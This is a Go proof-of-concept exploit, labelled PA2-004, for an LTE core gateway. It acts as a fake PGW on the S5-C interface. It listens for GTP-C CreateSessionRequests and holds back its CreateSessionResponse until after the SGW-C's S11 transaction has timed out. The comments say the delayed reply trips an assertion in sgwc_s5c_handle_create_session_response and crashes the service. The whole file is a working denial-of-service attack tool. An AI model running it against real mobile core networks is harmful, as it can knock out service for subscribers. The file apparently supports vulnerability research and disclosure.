// PoC for PA2-004: delay CreateSessionResponse on S5-C so SGW-C's associated
// S11 transaction is gone, triggering ogs_assert(s11_xact) in
// sgwc_s5c_handle_create_session_response().
//
// Run alongside an MME-side CSR sender (e.g., poc_vuln_pa2_orphan_cbr.go).
// This program listens on S5-C, waits for CSR from SGW-C, then sleeps for
// --delay before replying with a minimal CreateSessionResponse.
func main() {
	laddr := flag.String("laddr", "0.0.0.0", "Local IP to bind for S5-C")
	port := flag.Int("port", 2123, "GTP-C port")
	paa := flag.String("paa", "10.60.0.10", "PDN Address Allocation to return")
	ebi := flag.Uint("ebi", 5, "Default bearer EBI to echo if not parsed from request")
	pgwCtrlTEID := flag.Uint("pgw-teid", 0, "PGW S5-C TEID to advertise (0=random non-zero)")
	pgwUTeid := flag.Uint("pgw-uteid", 0, "PGW S5-U TEID to advertise (0=random non-zero)")
	delay := flag.Duration("delay", 10*time.Second, "Delay before sending CreateSessionResponse (aim to exceed S11 timeout)")
	seqOverride := flag.Uint("seq", 0, "Override CSR sequence in response (0=mirror request)")
	respondOnce := flag.Bool("respond-once", true, "Only respond once per (teid,seq); duplicates are ignored")
	flag.Parse()

	addr, err := net.ResolveUDPAddr("udp", net.JoinHostPort(*laddr, fmt.Sprintf("%d", *port)))
	if err != nil {
		log.Fatalf("resolve laddr: %v", err)
	}
	conn, err := net.ListenUDP("udp", addr)
	if err != nil {
		log.Fatalf("listen udp: %v", err)
	}
	defer conn.Close()

	log.Printf("[*] PA2-004 PGW PoC listening on %s (delay %s)", addr, *delay)

	seen := make(map[string]struct{})
	buf := make([]byte, 4096)
	for {
		n, raddr, err := conn.ReadFromUDP(buf)
		if err != nil {
			log.Printf("read err: %v", err)
			continue
		}
		msg, err := message.Parse(buf[:n])
		if err != nil {
			log.Printf("ignored undecodable packet from %s: %v", raddr, err)
			continue
		}

		req, ok := msg.(*message.CreateSessionRequest)
		if !ok {
			log.Printf("ignored %s from %s", msg.MessageTypeName(), raddr)
			continue
		}

		sgwTeid := uint32(0)
		if req.SenderFTEIDC != nil {
			if v, err := req.SenderFTEIDC.TEID(); err == nil {
				sgwTeid = v
			}
		}
		if sgwTeid == 0 {
			log.Printf("CSR missing sender F-TEID; cannot respond to %s", raddr)
			continue
		}

		respSeq := req.Sequence()
		if *seqOverride != 0 {
			respSeq = uint32(*seqOverride)
		}

		key := fmt.Sprintf("%x-%x", sgwTeid, respSeq)
		if *respondOnce {
			if _, ok := seen[key]; ok {
				log.Printf("[*] Ignored duplicate CSR teid=0x%x seq=0x%x from %s", sgwTeid, respSeq, raddr)
				continue
			}
			seen[key] = struct{}{}
		}

		cbEbi := uint8(*ebi)
		for _, bc := range req.BearerContextsToBeCreated {
			if bc == nil {
				continue
			}
			if v, err := bc.EPSBearerID(); err == nil && v != 0 {
				cbEbi = v
				break
			}
		}
		if req.LinkedEBI != nil {
			if v, err := req.LinkedEBI.EPSBearerID(); err == nil && v != 0 {
				cbEbi = v
			}
		}

		pgwCtrl := randNonZeroUint32(uint32(*pgwCtrlTEID))
		pgwU := randNonZeroUint32(uint32(*pgwUTeid))

		log.Printf("[*] Got CSR seq=0x%x teid=0x%x from %s; delaying %s", respSeq, sgwTeid, raddr, *delay)
		if *delay > 0 {
			time.Sleep(*delay)
		}

		if err := sendCSRResponse(conn, raddr, sgwTeid, respSeq, pgwCtrl, pgwU, *paa, cbEbi); err != nil {
			log.Printf("send CSR response failed: %v", err)
			continue
		}
	}
}

func sendCSRResponse(conn *net.UDPConn, raddr *net.UDPAddr, sgwTeid, seq, pgwCtrlTeid, pgwUTeid uint32, paa string, ebi uint8) error {
	localIP := ""
	if conn.LocalAddr() != nil {
		if u, ok := conn.LocalAddr().(*net.UDPAddr); ok && u.IP != nil {
			localIP = u.IP.String()
		}
	}
	if localIP == "" {
		return fmt.Errorf("local IP unknown")
	}

	cause := ie.NewCause(gtpv2.CauseRequestAccepted, 0, 0, 0, nil)
	// Provide both inst 0 and 1 for control-plane F-TEID.
	ctrlFTEID0 := ie.NewFullyQualifiedTEID(gtpv2.IFTypeS5S8PGWGTPC, pgwCtrlTeid, localIP, "")
	ctrlFTEID1 := ie.NewFullyQualifiedTEID(gtpv2.IFTypeS5S8PGWGTPC, pgwCtrlTeid, localIP, "").WithInstance(1)
	pa := ie.NewPDNAddressAllocation(paa)

	bctx := ie.NewBearerContext(
		ie.NewEPSBearerID(ebi),
		ie.NewCause(gtpv2.CauseRequestAccepted, 0, 0, 0, nil),
		ie.NewFullyQualifiedTEID(gtpv2.IFTypeS5S8PGWGTPU, pgwUTeid, localIP, "").WithInstance(2),
	)

	rsp := message.NewCreateSessionResponse(
		sgwTeid, seq,
		cause,
		ctrlFTEID0,
		ctrlFTEID1,
		pa,
		bctx,
	)

	b, err := rsp.Marshal()
	if err != nil {
		return fmt.Errorf("marshal CSR response: %w", err)
	}
	if _, err := conn.WriteToUDP(b, raddr); err != nil {
		return fmt.Errorf("send CSR response: %w", err)
	}
	log.Printf("[+] Sent delayed CreateSessionResponse seq=0x%x teid=0x%x -> %s (ctrl=0x%x u=0x%x)", seq, sgwTeid, raddr, pgwCtrlTeid, pgwUTeid)
	return nil
}

func randNonZeroUint32(v uint32) uint32 {
	if v != 0 {
		return v
	}
	r := time.Now().UnixNano() & 0xffffffff
	if r == 0 {
		return 1
	}
	return uint32(r)
}

